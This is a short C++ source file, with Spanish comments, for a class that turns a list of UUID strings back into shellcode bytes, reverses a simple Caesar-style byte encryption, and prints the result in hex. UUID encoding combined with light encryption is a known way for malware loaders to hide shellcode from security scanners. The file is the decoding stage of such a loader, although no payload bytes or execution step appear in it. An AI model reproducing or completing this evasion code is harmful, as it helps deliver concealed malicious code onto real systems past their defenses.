#include "ShellcodeManager.h"

ShellcodeManager::ShellcodeManager() {
	_UUIDListToShellcode(this->uuid_shellcode_vector);

	this->_CaesarDecrypt(this->shellcode, this->key);

	for (unsigned char byte : shellcode) {
		std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
	}
	std::cout << std::endl;
}

std::vector<unsigned char> ShellcodeManager::GetShellcode()
{
	return shellcode;
}

VOID ShellcodeManager::PrintShellcode() {
	std::cout << "Cifrado con llave 0xDE:" << std::endl;
	for (size_t i = 0; i < shellcode.size(); ++i) {
		std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(shellcode[i]) << ", ";
		if ((i + 1) % 16 == 0) {
			std::cout << "\n";  // Salto de línea cada 16 bytes para mejor visualización
		}
	}
	std::cout << std::endl;
}

std::vector<unsigned char> ShellcodeManager::_HexStringToBytes(const std::string& hex) {
	std::vector<unsigned char> bytes;
	for (size_t i = 0; i < hex.length(); i += 2) {
		unsigned int byte;
		std::stringstream ss;
		ss << std::hex << hex.substr(i, 2);
		ss >> byte;
		bytes.push_back(static_cast<unsigned char>(byte));
	}
	return bytes;
}

VOID ShellcodeManager::_UUIDListToShellcode(const std::vector<std::string>& uuidList) {
	//std::vector<unsigned char> shellcode;
	for (const auto& uuid : uuidList) {
		// Eliminar los guiones
		std::string hexString;
		for (char c : uuid) {
			if (c != '-') {
				hexString += c;
			}
		}
		// Convertir el UUID (sin guiones) en bytes y agregarlos al shellcode
		std::vector<unsigned char> bytes = _HexStringToBytes(hexString);
		shellcode.insert(shellcode.end(), bytes.begin(), bytes.end());
	}
}

VOID ShellcodeManager::_CaesarDecrypt(std::vector<unsigned char>& data, unsigned char key) {
	for (auto& byte : data) {
		byte = (byte - key) % 0x100;  // Descifrado César con clave
	}
}
